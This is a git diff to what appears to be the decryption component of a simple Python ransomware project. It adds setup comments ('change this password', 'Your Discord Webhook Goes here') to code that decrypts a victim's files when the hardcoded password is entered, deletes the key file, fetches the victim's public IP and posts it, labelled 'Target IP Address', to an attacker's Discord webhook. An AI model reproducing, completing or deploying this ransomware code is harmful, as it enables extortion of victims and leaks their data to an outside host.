@@ -5,11 +5,11 @@ import time
 import requests
 from requests import get
 import datetime
-os.system("clear")
+os.system("clear") 
 files=[]
 
 for file in os.listdir():
-    if file == 'en.py'or file == "enkey.key" or file == "dc.py" or file == "decrypt.txt":
+    if file == 'en.py'or file == "enkey.key" or file == "dc.py" or file == "decrypt.txt": ### Main files that are going to be created 'enkey.key' 'and decrypt.txt'.
         continue
     if os.path.isfile(file):
             files.append(file)
@@ -19,7 +19,7 @@ with open("enkey.key","rb") as key:
     seckey=key.read()
 
 user=input("Enter the password to Decrypt your files: ")
-if user == "hello":
+if user == "hello": ### change this password.
     for file in files:
         with open(file, "rb") as thefile:
             cont=thefile.read()
@@ -30,18 +30,18 @@ if user == "hello":
                 os.remove("enkey.key")
             except:
                 continue
-
+         ### Webhook to Discord
             print("Task Sucessful, All files were Decrypted")
             ip=get("https://api.ipify.org").text
             dt = datetime.datetime.now()
             nowt=dt.strftime("%Y-%m-%d %H:%M:%S")
-            url = "YOUR DISCORD GOES HERE"
+            url = "" ### Your Discord Webhook Goes here, inside the Quotes.
             
             x = f"""```
-Ransome was Decrypted on a Computer!
-------------------------------------- 
+Ransom was Decrypted on a Computer!
+------------------------------------
 Target IP Address ~> {ip} 
--------------------------------------
+------------------------------------
 Time ~> {nowt}``` """
             r=requests.post(url, data={"content": x})
 
